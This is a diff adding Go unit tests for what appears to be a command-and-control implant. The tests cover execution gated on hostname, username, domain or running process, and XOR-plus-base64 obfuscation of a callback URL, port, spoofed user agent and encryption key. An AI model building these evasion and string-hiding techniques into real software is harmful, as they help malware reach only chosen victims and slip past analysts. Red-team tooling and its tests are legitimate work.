@@ -1,6 +1,8 @@
 package main
 
 import (
+	"encoding/base64"
+	"os"
 	"testing"
 	"time"
 )
@@ -179,5 +181,235 @@ func TestGetIntegrityLevel_NonRootIsMedium(t *testing.T) {
 	// Running as root should return 4 (system)
 	if level != 2 && level != 4 {
 		t.Errorf("getIntegrityLevel() = %d, want 2 (non-root) or 4 (root)", level)
+	}
+}
+
+// --- regexMatch Tests ---
+
+func TestRegexMatch_ExactMatch(t *testing.T) {
+	if !regexMatch("WORKSTATION1", "WORKSTATION1") {
+		t.Error("exact match should return true")
+	}
+}
+
+func TestRegexMatch_CaseInsensitive(t *testing.T) {
+	if !regexMatch("workstation1", "WORKSTATION1") {
+		t.Error("case-insensitive match should return true")
+	}
+}
+
+func TestRegexMatch_RegexPattern(t *testing.T) {
+	if !regexMatch("WORK.*", "WORKSTATION1") {
+		t.Error("wildcard pattern should match")
+	}
+}
+
+func TestRegexMatch_DomainPattern(t *testing.T) {
+	if !regexMatch(`.*\.contoso\.com`, "host.contoso.com") {
+		t.Error("domain pattern should match FQDN")
+	}
+}
+
+func TestRegexMatch_NoMatch(t *testing.T) {
+	if regexMatch("SERVER.*", "WORKSTATION1") {
+		t.Error("non-matching pattern should return false")
+	}
+}
+
+func TestRegexMatch_InvalidRegex(t *testing.T) {
+	// Invalid regex should fail closed (return false)
+	if regexMatch("[invalid", "anything") {
+		t.Error("invalid regex should return false (fail closed)")
+	}
+}
+
+func TestRegexMatch_FullStringAnchored(t *testing.T) {
+	// Pattern should match the FULL string, not just a substring
+	if regexMatch("WORK", "WORKSTATION1") {
+		t.Error("partial pattern should not match full string (anchored)")
+	}
+}
+
+func TestRegexMatch_AlternationPattern(t *testing.T) {
+	if !regexMatch("host1|host2|host3", "host2") {
+		t.Error("alternation pattern should match")
+	}
+}
+
+// --- checkEnvironmentKeys Tests ---
+
+func TestCheckEnvironmentKeys_NoKeysConfigured(t *testing.T) {
+	// When no keys are set, should pass
+	envKeyHostname = ""
+	envKeyDomain = ""
+	envKeyUsername = ""
+	envKeyProcess = ""
+	if !checkEnvironmentKeys() {
+		t.Error("no keys configured should pass")
+	}
+}
+
+func TestCheckEnvironmentKeys_HostnameMatch(t *testing.T) {
+	hostname, _ := os.Hostname()
+	envKeyHostname = hostname
+	envKeyDomain = ""
+	envKeyUsername = ""
+	envKeyProcess = ""
+	if !checkEnvironmentKeys() {
+		t.Errorf("hostname key %q should match current hostname %q", envKeyHostname, hostname)
+	}
+}
+
+func TestCheckEnvironmentKeys_HostnameNoMatch(t *testing.T) {
+	envKeyHostname = "IMPOSSIBLE-HOSTNAME-12345"
+	envKeyDomain = ""
+	envKeyUsername = ""
+	envKeyProcess = ""
+	if checkEnvironmentKeys() {
+		t.Error("impossible hostname should not match")
+	}
+	envKeyHostname = "" // cleanup
+}
+
+func TestCheckEnvironmentKeys_UsernameMatch(t *testing.T) {
+	username := getUsername()
+	envKeyHostname = ""
+	envKeyDomain = ""
+	envKeyUsername = username
+	envKeyProcess = ""
+	if !checkEnvironmentKeys() {
+		t.Errorf("username key %q should match current user", username)
+	}
+}
+
+func TestCheckEnvironmentKeys_UsernameWildcard(t *testing.T) {
+	envKeyHostname = ""
+	envKeyDomain = ""
+	envKeyUsername = ".*" // match any username
+	envKeyProcess = ""
+	if !checkEnvironmentKeys() {
+		t.Error("wildcard username should match any user")
+	}
+	envKeyUsername = "" // cleanup
+}
+
+func TestCheckEnvironmentKeys_ProcessMatch(t *testing.T) {
+	// The test runner process should always be running
+	envKeyHostname = ""
+	envKeyDomain = ""
+	envKeyUsername = ""
+	// On Linux, check for "init" or "systemd" which should always be running
+	envKeyProcess = "systemd"
+	result := checkEnvironmentKeys()
+	// Reset before potential failure
+	envKeyProcess = ""
+	if !result {
+		t.Log("systemd not found — may be expected in some environments")
+	}
+}
+
+func TestCheckEnvironmentKeys_ProcessNoMatch(t *testing.T) {
+	envKeyHostname = ""
+	envKeyDomain = ""
+	envKeyUsername = ""
+	envKeyProcess = "impossible_process_name_xyz_999"
+	if checkEnvironmentKeys() {
+		t.Error("impossible process name should not match")
+	}
+	envKeyProcess = "" // cleanup
+}
+
+// --- getEnvironmentDomain Tests ---
+
+func TestGetEnvironmentDomain_ReturnsString(t *testing.T) {
+	domain := getEnvironmentDomain()
+	// May be empty on non-domain joined systems
+	t.Logf("getEnvironmentDomain() = %q", domain)
+}
+
+// --- isProcessRunning Tests ---
+
+func TestIsProcessRunning_Init(t *testing.T) {
+	// PID 1 should always exist on Linux
+	if !isProcessRunning("systemd") && !isProcessRunning("init") {
+		t.Log("neither systemd nor init found — may be expected in containers")
+	}
+}
+
+func TestIsProcessRunning_Nonexistent(t *testing.T) {
+	if isProcessRunning("totally_fake_process_xyz") {
+		t.Error("fake process name should not be found")
+	}
+}
+
+// --- xorDecodeString Tests ---
+
+func TestXorDecodeString_RoundTrip(t *testing.T) {
+	key := []byte{0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48}
+	plaintext := "http://192.168.100.184"
+
+	// Encode: XOR then base64
+	data := []byte(plaintext)
+	encoded := make([]byte, len(data))
+	for i, b := range data {
+		encoded[i] = b ^ key[i%len(key)]
+	}
+	encodedB64 := base64.StdEncoding.EncodeToString(encoded)
+
+	// Decode
+	result := xorDecodeString(encodedB64, key)
+	if result != plaintext {
+		t.Errorf("xorDecodeString roundtrip failed: got %q, want %q", result, plaintext)
+	}
+}
+
+func TestXorDecodeString_EmptyString(t *testing.T) {
+	key := []byte{0x01, 0x02}
+	result := xorDecodeString("", key)
+	if result != "" {
+		t.Errorf("empty string should return empty, got %q", result)
+	}
+}
+
+func TestXorDecodeString_EmptyKey(t *testing.T) {
+	result := xorDecodeString("dGVzdA==", nil)
+	// Empty key should return original encoded string
+	if result != "dGVzdA==" {
+		t.Errorf("empty key should return original, got %q", result)
+	}
+}
+
+func TestXorDecodeString_NotBase64(t *testing.T) {
+	key := []byte{0x01}
+	// Invalid base64 should return original string
+	result := xorDecodeString("not-valid-base64!!!", key)
+	if result != "not-valid-base64!!!" {
+		t.Errorf("invalid base64 should return original, got %q", result)
+	}
+}
+
+func TestXorDecodeString_MultipleStrings(t *testing.T) {
+	key := []byte("random32bytekeyforxorobfuscation")
+	testCases := []string{
+		"http://192.168.100.184",
+		"443",
+		"/data",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+		"aes-encryption-key-value-here",
+		"some-uuid-1234-5678",
+	}
+
+	for _, tc := range testCases {
+		data := []byte(tc)
+		encoded := make([]byte, len(data))
+		for i, b := range data {
+			encoded[i] = b ^ key[i%len(key)]
+		}
+		encodedB64 := base64.StdEncoding.EncodeToString(encoded)
+
+		result := xorDecodeString(encodedB64, key)
+		if result != tc {
+			t.Errorf("roundtrip failed for %q: got %q", tc, result)
+		}
 	}
 }
